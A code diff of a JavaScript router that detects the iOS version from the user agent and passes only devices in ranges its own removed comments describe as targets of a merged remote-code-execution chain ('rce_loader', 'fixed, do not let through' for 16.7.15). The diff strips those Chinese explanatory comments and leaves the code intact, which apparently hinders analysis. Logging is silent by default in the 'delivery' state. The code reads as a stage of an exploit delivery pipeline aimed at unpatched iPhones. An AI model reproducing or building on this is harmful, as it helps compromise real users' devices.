@@ -3,8 +3,8 @@
 
   function getIOSVersion() {
     function pad(s) { return s.length === 1 ? '0' + s : s; }
-    // v3 合并版：优先解析 OS 版本串（CPU iPhone OS 15_8 / 15_8_7），
-    // 能区分补丁版；Safari Version/ 仅作兜底
+    
+    
     var u = ua.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/);
     if (u) return parseInt(pad(u[1]) + pad(u[2]) + (u[3] ? pad(u[3]) : '00'), 10);
     u = ua.match(/CPU OS (\d+)_(\d+)(?:_(\d+))?/);
@@ -18,13 +18,13 @@
 
   var ver = getIOSVersion();
 
-  // 日志总开关（router/chain_main 共用，对齐 18 线 rce_loader 的 SERVER_LOG）：
-  // false = 完全静默（默认/交付态）；true = 客户端打印 + /api/debug/logs 逐条镜像到服务器。
-  // 真机排障时把这里改成 true，交付默认 false。
+  
+  
+  
   window.__15X_SERVER_LOG = false;
   var __15X_LOGID = 0;
 
-  // rlog：console + 宿主日志面板钩子 + sessionStorage 接力（悬浮面板续显）+ /api/debug/logs 同步镜像
+  
   function rlog(msg) {
     var line = '[router] ' + msg;
     if (!window.__15X_SERVER_LOG) return;
@@ -46,7 +46,7 @@
 
   rlog('iOS version: ' + ver + (ver ? '' : '(非 iOS 环境)'));
 
-  // 对齐 18 线：链内脚本下载带 page_view 的 eventId（&ctx=），供服务端关联访问与资源下载
+  
   function runtimeEventId() {
     try {
       var b = window.PromotionIntegrationBridge;
@@ -67,9 +67,9 @@
     });
   }
 
-  // v3 合并版版本门：五线并一（各线范围合并）
-  //   13x: 13.0.0 – 13.7.0 | 14x: 14.0.0 – 14.8.1 | 15x: 15.0.0 – 15.8.6
-  //   16x: 16.0.0 – 16.7.14（16.7.13/.14 未验证但同行链不拦，门随同行；16.7.15 已修复不放行） | 17x: 17.0.0 – 17.2.1
+  
+  
+  
   if ((ver >= 130000 && ver <= 130700) ||
       (ver >= 140000 && ver <= 140801) ||
       (ver >= 150000 && ver <= 150808) ||
